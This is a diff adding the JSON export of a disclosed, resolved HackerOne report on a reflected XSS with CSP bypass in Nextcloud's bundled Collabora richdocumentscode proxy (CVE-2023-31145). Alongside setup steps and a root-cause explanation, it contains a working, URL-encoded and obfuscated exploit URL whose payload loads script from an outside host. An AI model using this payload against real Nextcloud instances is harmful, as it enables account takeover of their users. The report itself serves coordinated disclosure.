@@ -1,0 +1,428 @@
+{
+  "id": 1893186,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODkzMTg2",
+  "url": "https://hackerone.com/reports/1893186",
+  "title": "Reflected XSS vulnerability with full CSP bypass in Nextcloud installations using recommended bundle",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2023-03-06T13:30:37.250Z",
+  "submitted_at": "2023-03-06T13:48:53.293Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "lukasreschke",
+    "url": "/lukasreschke",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/037/891/e7fea4d5383dc07d1fe767b02f3bda2bc7639c63_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2023-31145"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-05-15T06:44:55.846Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-05-08T09:51:08.526Z",
+  "team_member_agreed_on_going_public_at": "2023-05-15T06:44:55.734Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n\nThe vulnerability report describes a reflected XSS vulnerability with full CSP bypass in Nextcloud installations using the recommended bundle. The vulnerability can be exploited to perform a trivial account takeover attack.\n\n## Steps To Reproduce:\n\n## Setup Nextcloud\nDownload the latest Nextcloud release from Docker and run it on port 80:\n\n```\ndocker run -d -p 80:80 nextcloud:latest\n```\n\nOpen `http://localhost` in your browser and enter your chosen admin username and password. On the next screen install all recommended apps. The standard \"Nextcloud Office\" here will result in installing the vulnerable `richdocumentscode` application (see [HubBundle.php](https://github.com/nextcloud/server/blob/eddc6f2103665d985a9e541b16d61fab5ba6a1ee/lib/private/App/AppStore/Bundles/HubBundle.php#L45)):\n\n{F2211280}\n\n## Exploitation\n\nOpen the following URL in your (or the victims) browser (the payload needs some extra encoding):\n\n> http://localhost/custom_apps/richdocumentscode/proxy.php?req=/browser/a4b9c74/cool.html?WOPISrc=http://example.com:%3c%69%6d%67%20%73%72%63%3d%27%27%20%6f%6e%65%72%72%6f%72%3d%27%73%3d%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%31%31%35%2c%39%39%2c%31%31%34%2c%31%30%35%2c%31%31%32%2c%31%31%36%29%29%3b%73%2e%73%72%63%3d%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%34%37%2c%20%34%37%2c%20%34%39%2c%20%35%33%2c%20%34%36%2c%20%31%31%34%2c%20%31%31%35%29%3b%64%6f%63%75%6d%65%6e%74%2e%62%6f%64%79%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%73%29%27%3e\n\nThere is a full CSP bypass as the `proxy.php` from the default shipped \"richdocumentscode\" is not using a regular Nextcloud controller but plain PHP code:\n\n{F2211288}\n\n\n## Root cause\n\n1. Collabora Online is generating HTML documents using insecure string concatenation. ([code pointer](https://github.com/CollaboraOnline/online/blob/00b0fd48c949af475f8be0cc5bfd2149805f7905/wsd/FileServer.cpp#L719-L722))\n2. The included `proxy.php` inside the \"richdocumentscode\" is not applying any of the default CSP policies of Nextcloud, as it is running on the same origin this can be used for a trivial account take over attack. ([code pointer](https://github.com/CollaboraOnline/richdocumentscode/blob/3043ad186a9896899ff8d6f3ea83c93c5d487b48/proxy.php))\n\n## Impact\n\nThe vulnerability allows attackers to inject malicious code into web pages, which can be executed in the context of the victim's browser session. This means that an attacker can steal sensitive data, such as login credentials or personal information, or perform unauthorized actions on behalf of the victim, such as modifying or deleting data.\n\nIn this specific case, the vulnerability allows for a trivial account takeover attack. An attacker can exploit the vulnerability to inject code into the victim's browser session, allowing the attacker to take over the victim's account without their knowledge or consent. This can lead to unauthorized access to sensitive information and data, as well as the ability to perform actions on behalf of the victim.\n\nFurthermore, the fact that the vulnerability bypasses the Content Security Policy (CSP) makes it more dangerous, as CSP is an important security mechanism used to prevent cross-site scripting attacks. By bypassing CSP, attackers can circumvent the security measures put in place by the web application and execute their malicious code.",
+  "weakness": {
+    "id": 61,
+    "name": "Cross-site Scripting (XSS) - Reflected"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 2211280,
+      "file_name": "Screenshot_2023-03-06_at_14.25.38.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/szk5prfl326brpizk7c3zeik5m4u?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2023-03-06_at_14.25.38.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2023-03-06_at_14.25.38.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRI2DKS33%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065526Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJGMEQCIClqVjComm5eHHgl4hk6izxePckLv8jDeMc0T9b7T3O3AiADmJZnWuzG%2B70iNqDIQCs8vCBykwa2yXC74JTt7oggICqyBQgjEAMaDDAxMzYxOTI3NDg0OSIMymNPAONb%2FCmXBdVeKo8FJzded9JrQRalz027Fy9ORg8M6dHgBBXFzVDsXNDc1JhsKfZyKPDvBwtVth3yDUjFVges68qucKHRijQ6l7wR%2BSrXd5GDh5pLy2MTIGZe67Nnez9UpyMMkMJctkxp2GshCXqzgeHl6v5vSB7diJyZoACs1T7UBRfBPVqB2ExFrI2%2ByTsFYZc7jw70kHGnPahik3gX45Na5Kayh8HRMrZ3nvkWoQsOaDXxlIuviOeI5Nyk%2BqknsMl85LFsHGofSTOGYZXckaP1kkyR%2Fws8c%2FsDxEPpjbWADHNIoe1MFd9enDvdgnJNwHThsUBDzs2HZ0DaxfueMMQsmaKM7fUJBEcCBdyLJgLh9FwY2rWv0osDiBaDwoJBATYz0TqNSzbPLCHXCY4yvjrupR020hIrH7h6vaAO5AGy8BvQlbd4pDsg3fydvKz0cbgeICmouv0Z1B%2BNOmdg%2BiZsobA1R9WzJqDzDfOVTl5%2BplONkde1nrnLg%2FMBW9mk6pF4ZVrKen5uchggefwkdoDb8%2BQe0Ajvj8x8xFdUsC%2FFWEdzRTRjBETbScuWC84tinh7KwW8N2gJzaorc6xcHTdBLvgUtj96BY6lEvsNyjfHwLGgutWn8FvrDQIseWHlWXnVVIfP4p6hSWttAAC9HFoMzHIskKQ8OP21vUmVnZdmOmSLz1dG07Xymll1yNHsBo3AtM2WqzA%2BgnJvv6xCVMBGtXCr%2Fwgk0SMyytjAAt2Ayqtb%2FMcO4y9jne5RcXfe18ZM26LZ8Q%2FAr%2B7y5tFCIDsL%2Bv%2Fu41E9njnrOd4bPbjlDbGY6FQGcUeT8IjQ6%2FqK9rzqwByRyUW84v%2Fm6tpHTp9GZ3Z%2F8GxGiq1ytLMwnn4Nr8mHZoVXW95MFDDxhbmoBjqyAZJiId57NZFL44uwPAXChJjOVBJpFacYn6dA566GE9JXcWCJbWbLvQ1PLav0JA%2FFjK1C6zjLxpR6Zgm%2Bb1YVJ%2Fwvyz5iKzFpjrw5DUkBbq7AqgC1wANIYsCzKnybPgJV%2FdvDI8wXqZ5s4I4kfGwElgjNbNXwCPPz0GSv35NPkyyyGZTFfTgucOASY3bZjNx0yQISVMqLnWZVnzBkXcLX7FeL1pcuvp4XRZgpKzT%2BnTs6PiU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=22125a4a8deb71fae43444dac01432c59b5133667680d72b035cf5e81299a7ed",
+      "file_size": 335082,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 2211288,
+      "file_name": "Screenshot_2023-03-06_at_14.28.45.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/bba5dztayprvvaee64a00ygziyqk?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2023-03-06_at_14.28.45.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2023-03-06_at_14.28.45.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRI2DKS33%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065526Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJGMEQCIClqVjComm5eHHgl4hk6izxePckLv8jDeMc0T9b7T3O3AiADmJZnWuzG%2B70iNqDIQCs8vCBykwa2yXC74JTt7oggICqyBQgjEAMaDDAxMzYxOTI3NDg0OSIMymNPAONb%2FCmXBdVeKo8FJzded9JrQRalz027Fy9ORg8M6dHgBBXFzVDsXNDc1JhsKfZyKPDvBwtVth3yDUjFVges68qucKHRijQ6l7wR%2BSrXd5GDh5pLy2MTIGZe67Nnez9UpyMMkMJctkxp2GshCXqzgeHl6v5vSB7diJyZoACs1T7UBRfBPVqB2ExFrI2%2ByTsFYZc7jw70kHGnPahik3gX45Na5Kayh8HRMrZ3nvkWoQsOaDXxlIuviOeI5Nyk%2BqknsMl85LFsHGofSTOGYZXckaP1kkyR%2Fws8c%2FsDxEPpjbWADHNIoe1MFd9enDvdgnJNwHThsUBDzs2HZ0DaxfueMMQsmaKM7fUJBEcCBdyLJgLh9FwY2rWv0osDiBaDwoJBATYz0TqNSzbPLCHXCY4yvjrupR020hIrH7h6vaAO5AGy8BvQlbd4pDsg3fydvKz0cbgeICmouv0Z1B%2BNOmdg%2BiZsobA1R9WzJqDzDfOVTl5%2BplONkde1nrnLg%2FMBW9mk6pF4ZVrKen5uchggefwkdoDb8%2BQe0Ajvj8x8xFdUsC%2FFWEdzRTRjBETbScuWC84tinh7KwW8N2gJzaorc6xcHTdBLvgUtj96BY6lEvsNyjfHwLGgutWn8FvrDQIseWHlWXnVVIfP4p6hSWttAAC9HFoMzHIskKQ8OP21vUmVnZdmOmSLz1dG07Xymll1yNHsBo3AtM2WqzA%2BgnJvv6xCVMBGtXCr%2Fwgk0SMyytjAAt2Ayqtb%2FMcO4y9jne5RcXfe18ZM26LZ8Q%2FAr%2B7y5tFCIDsL%2Bv%2Fu41E9njnrOd4bPbjlDbGY6FQGcUeT8IjQ6%2FqK9rzqwByRyUW84v%2Fm6tpHTp9GZ3Z%2F8GxGiq1ytLMwnn4Nr8mHZoVXW95MFDDxhbmoBjqyAZJiId57NZFL44uwPAXChJjOVBJpFacYn6dA566GE9JXcWCJbWbLvQ1PLav0JA%2FFjK1C6zjLxpR6Zgm%2Bb1YVJ%2Fwvyz5iKzFpjrw5DUkBbq7AqgC1wANIYsCzKnybPgJV%2FdvDI8wXqZ5s4I4kfGwElgjNbNXwCPPz0GSv35NPkyyyGZTFfTgucOASY3bZjNx0yQISVMqLnWZVnzBkXcLX7FeL1pcuvp4XRZgpKzT%2BnTs6PiU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7b5ede8220afb69d523587588207d1e8ac5220617ad0d7b767d497ac28585d40",
+      "file_size": 142696,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2023-06-07T09:51:08.593Z",
+  "allow_singular_disclosure_after": -9320657.510518013,
+  "singular_disclosure_allowed": true,
+  "vote_count": 11,
+  "voters": [
+    "nicochess",
+    "zy9ard3",
+    "madara1452",
+    "monish-3377",
+    "kuwrodney",
+    "locate",
+    "unrelated",
+    "smoker09",
+    "cadmium_9n",
+    "cherrykitten",
+    "and 1 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 4.3,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 68219,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "nextcloud/richdocuments",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 20666211,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks a lot for reporting this potential issue back to us!\n\nOur security team will take a look at this issue as soon as possible. For obvious reasons we'd like to ask you to not disclose this issue to any other party.",
+      "automated_response": true,
+      "created_at": "2023-03-06T13:48:53.831Z",
+      "updated_at": "2023-03-06T13:48:53.831Z",
+      "actor": {
+        "url": "/nextcloud",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Nextcloud"
+        }
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 20682480,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-03-07T09:40:14.282Z",
+      "updated_at": "2023-03-07T09:40:14.282Z",
+      "actor": {
+        "username": "nickvergessen",
+        "cleared": false,
+        "verified": false,
+        "url": "/nickvergessen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 20682493,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-03-07T09:41:26.774Z",
+      "updated_at": "2023-03-07T09:41:26.774Z",
+      "additional_data": {
+        "old_severity": "Critical",
+        "new_severity": "Medium (4.3)",
+        "old_severity_id": 1888256,
+        "new_severity_id": 1890121
+      },
+      "actor": {
+        "username": "nickvergessen",
+        "cleared": false,
+        "verified": false,
+        "url": "/nickvergessen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 20734925,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::NotEligibleForBounty",
+      "message": "The problematic part is in the richdocumentscode app which is not within the scope of monetary rewards.\n\nWe still would proceed with the ticket and close it as resolved once the thirdparty maintainer fixed the issue.",
+      "automated_response": false,
+      "created_at": "2023-03-10T11:19:32.020Z",
+      "updated_at": "2023-03-10T11:19:32.020Z",
+      "actor": {
+        "url": "/nextcloud",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Nextcloud"
+        }
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 21731949,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::CveIdAdded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-05-08T09:47:48.825Z",
+      "updated_at": "2023-05-08T09:47:48.825Z",
+      "cve_ids": [
+        "CVE-2023-31145"
+      ],
+      "actor": {
+        "username": "nickvergessen",
+        "cleared": false,
+        "verified": false,
+        "url": "/nickvergessen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 21731953,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Thanks a lot for your report again. This has been resolved in our partner's latest maintenance releases and they worked on the advisories.\n\nIf you have a GitHub account please let us know the username, and we will ask them to associate it with the advisory.\n",
+      "automated_response": false,
+      "created_at": "2023-05-08T09:48:43.110Z",
+      "updated_at": "2023-05-08T09:48:43.110Z",
+      "actor": {
+        "username": "nickvergessen",
+        "cleared": false,
+        "verified": false,
+        "url": "/nickvergessen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "lukasreschke",
+        "url": "/lukasreschke"
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 21731959,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Security advisory at https://github.com/CollaboraOnline/online/security/advisories/GHSA-rqj2-2c2x-gjmm",
+      "automated_response": false,
+      "created_at": "2023-05-08T09:50:14.058Z",
+      "updated_at": "2023-05-08T09:50:14.058Z",
+      "actor": {
+        "username": "nickvergessen",
+        "cleared": false,
+        "verified": false,
+        "url": "/nickvergessen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 21731966,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-05-08T09:51:08.561Z",
+      "updated_at": "2023-05-08T09:51:08.561Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "lukasreschke",
+        "cleared": false,
+        "verified": false,
+        "url": "/lukasreschke",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/037/891/e7fea4d5383dc07d1fe767b02f3bda2bc7639c63_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 21846932,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-05-15T06:44:55.780Z",
+      "updated_at": "2023-05-15T06:44:55.780Z",
+      "actor": {
+        "username": "nickvergessen",
+        "cleared": false,
+        "verified": false,
+        "url": "/nickvergessen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 21846933,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-05-15T06:44:55.922Z",
+      "updated_at": "2023-05-15T06:44:55.922Z",
+      "actor": {
+        "username": "nickvergessen",
+        "cleared": false,
+        "verified": false,
+        "url": "/nickvergessen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "id": 289232,
+      "category": "team",
+      "content": "Security advisory at https://github.com/CollaboraOnline/online/security/advisories/GHSA-rqj2-2c2x-gjmm",
+      "user": {
+        "id": 89223,
+        "username": "nickvergessen",
+        "name": "Joas Schilling",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "Germany",
+        "created_at": "2016-07-01T08:17:59.061Z",
+        "url": "https://hackerone.com/nickvergessen",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [
+
+      ]
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
